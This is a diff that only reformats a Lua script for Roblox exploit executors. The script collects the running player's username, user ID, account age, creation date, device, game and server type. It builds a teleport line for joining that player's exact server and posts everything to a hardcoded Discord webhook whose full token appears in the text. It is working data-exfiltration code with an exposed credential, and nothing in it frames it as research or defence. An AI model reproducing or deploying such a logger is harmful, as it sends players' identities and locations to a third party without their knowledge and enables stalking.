@@ -5,10 +5,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService = game:GetService("UserInputService")
 
-local request = (syn and syn.request)
-    or (http and http.request)
-    or http_request
-    or request
+local request = (syn and syn.request) or (http and http.request) or http_request or request
 
 if not request then
     warn("Your executor does not support HTTP requests.")
@@ -21,7 +18,8 @@ while not player do
     player = Players.LocalPlayer
 end
 
-local webhook_url = "https://discord.com/api/webhooks/1360924471598252152/7G2pKlkqKP8pt8T38G0o0QwKXgZSJD79drX30FJDftep24nCUGGgEbNQ4RuKqILi-ugo"
+local webhook_url =
+    "https://discord.com/api/webhooks/1360924471598252152/7G2pKlkqKP8pt8T38G0o0QwKXgZSJD79drX30FJDftep24nCUGGgEbNQ4RuKqILi-ugo"
 
 local function getTimestamp()
     return os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -29,9 +27,11 @@ end
 
 local function getReadablePlatform()
     local rawPlatform = "Unknown"
-    pcall(function()
-        rawPlatform = UserInputService:GetPlatform().Name
-    end)
+    pcall(
+        function()
+            rawPlatform = UserInputService:GetPlatform().Name
+        end
+    )
 
     local platformMap = {
         Windows = "PC (Windows)",
@@ -47,10 +47,13 @@ local function getReadablePlatform()
 end
 
 local accountCreatedDate = "Unknown"
-local userInfoResponse = request({
-    Url = "https://users.roblox.com/v1/users/" .. player.UserId,
-    Method = "GET"
-})
+local userInfoResponse =
+    request(
+    {
+        Url = "https://users.roblox.com/v1/users/" .. player.UserId,
+        Method = "GET"
+    }
+)
 
 if userInfoResponse and userInfoResponse.StatusCode == 200 then
     local userData = HttpService:JSONDecode(userInfoResponse.Body)
@@ -67,9 +70,12 @@ local gameName = "Unknown Game"
 local placeId = game.PlaceId
 local jobId = game.JobId
 
-local success, info = pcall(function()
-    return MarketplaceService:GetProductInfo(placeId)
-end)
+local success, info =
+    pcall(
+    function()
+        return MarketplaceService:GetProductInfo(placeId)
+    end
+)
 
 if success and info then
     gameName = info.Name
@@ -77,42 +83,52 @@ end
 
 local serverType = game.PrivateServerId ~= "" and "Private Server" or "Public Server"
 
-local joinScript = string.format(
+local joinScript =
+    string.format(
     'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
-    placeId, jobId
+    placeId,
+    jobId
 )
 
 local data = {
     ["username"] = "Roblox User",
-    ["embeds"] = {{
-        ["title"] = "Script Executed",
-        ["description"] = "User info has been sent successfully.",
-        ["color"] = 65280,
-        ["fields"] = {
-            { ["name"] = "Username", ["value"] = player.Name, ["inline"] = true },
-            { ["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true },
-            { ["name"] = "Account Age", ["value"] = tostring(player.AccountAge) .. " Days Old", ["inline"] = true },
-            { ["name"] = "Created At", ["value"] = accountCreatedDate, ["inline"] = true },
-            { ["name"] = "Device", ["value"] = platform, ["inline"] = true },
-            { ["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true },
-            { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
-            { ["name"] = "Server Type", ["value"] = serverType, ["inline"] = true },
-            { ["name"] = "Join Script (Mobile)", ["value"] = joinScript, ["inline"] = false },
-            { ["name"] = "Join Script (PC)", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false },
-            { ["name"] = "Profile", ["value"] = "[View Profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)", ["inline"] = false }
-        },
-        ["footer"] = { ["text"] = "By mvp_kfc | " .. platform },
-        ["timestamp"] = getTimestamp()
-    }}
+    ["embeds"] = {
+        {
+            ["title"] = "Script Executed",
+            ["description"] = "User info has been sent successfully.",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = tostring(player.AccountAge) .. " Days Old", ["inline"] = true},
+                {["name"] = "Created At", ["value"] = accountCreatedDate, ["inline"] = true},
+                {["name"] = "Device", ["value"] = platform, ["inline"] = true},
+                {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true},
+                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
+                {["name"] = "Server Type", ["value"] = serverType, ["inline"] = true},
+                {["name"] = "Join Script (Mobile)", ["value"] = joinScript, ["inline"] = false},
+                {["name"] = "Join Script (PC)", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false},
+                {
+                    ["name"] = "Profile",
+                    ["value"] = "[View Profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {["text"] = "By mvp_kfc | " .. platform},
+            ["timestamp"] = getTimestamp()
+        }
+    }
 }
 
 local jsonData = HttpService:JSONEncode(data)
 
-request({
-    Url = webhook_url,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = jsonData
-})
+request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    }
+)
